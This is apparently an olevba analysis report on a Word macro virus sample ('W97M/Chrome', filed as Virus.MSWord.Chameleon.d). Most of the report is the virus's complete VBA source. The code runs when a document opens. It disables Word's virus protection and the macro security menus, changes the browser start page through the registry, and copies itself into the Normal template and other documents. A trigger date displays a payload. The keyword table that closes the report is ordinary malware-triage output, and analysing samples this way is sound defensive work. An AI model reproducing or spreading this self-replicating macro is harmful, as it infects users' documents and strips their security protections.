olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Chameleon.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Chameleon.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
    On Error Resume Next
    If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "MVP") <> "Enabled by Total Konfuzion" Then
        Randomize
        System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main", "Start Page") = "http://codemonkey.cjb.net"
        If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Security", "Level") <> "" Then
            CommandBars("Macro").Controls("Security...").Enabled = (Rnd * 0)
        Else
            CommandBars("Tools").Controls("Macro").Enabled = (Rnd * 0)
            CommandBars("Tools").Controls("Templates and Add-ins...").Enabled = (Rnd * 0)
            CommandBars("Format").Controls("Style Gallery...").Enabled = (Rnd * 0)
        End If
        With Options
            .VirusProtection = (Rnd * 0)
            .SaveNormalPrompt = (Rnd * 0)
            .ConfirmConversions = (Rnd * 0)
        End With
        With Application
            .EnableCancelKey = wdCancelDisabled
            .UserName = "Total Konfuzion"
            .UserInitials = "TK"
            .UserAddress = "W97M/Chrome"
        End With
        If ThisDocument = ActiveDocument Then Set i = NormalTemplate Else Set i = ActiveDocument
        Vx = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
        Set d = i.VBProject.VBComponents.Item(1).CodeModule
        d.DeleteLines 1, d.CountOfLines
        d.AddFromString Vx
        Chrome = "The day of the Chrome is comming...   >8)      "
        If Day(Now) <> "15" Then
            StatusBar = Chrome
            Application.Caption = Chrome
        End If
        If Day(Now) = "15" Then
            Application.Caption = Chrome
            With ActiveDocument.Shapes.AddShape(msoShapeSmileyFace, 220, 150, 150, 140).Fill
                .ForeColor.RGB = RGB(90, 90, 100)
                .BackColor.RGB = RGB(190, 211, 230)
                .TwoColorGradient msoGradientHorizontal, 1
            End With
        End If
        ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
    End If
End Sub
Sub HelpAbout()
    MsgBox "W97M/Chrome" + vbCr + vbCr + "  -Total Konfuzion-", vbSystemModal, ">8)"
End Sub
Private Sub AutoClose()
    If Day(Now) = Minute(Now) Then MsgBox "The day of the Chrome is comming...   >8)", vbCritical + vbSystemModal, "W97M/Chrome"
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://codemonkey.cj|URL                                          |
|          |b.net               |                                             |
+----------+--------------------+---------------------------------------------+

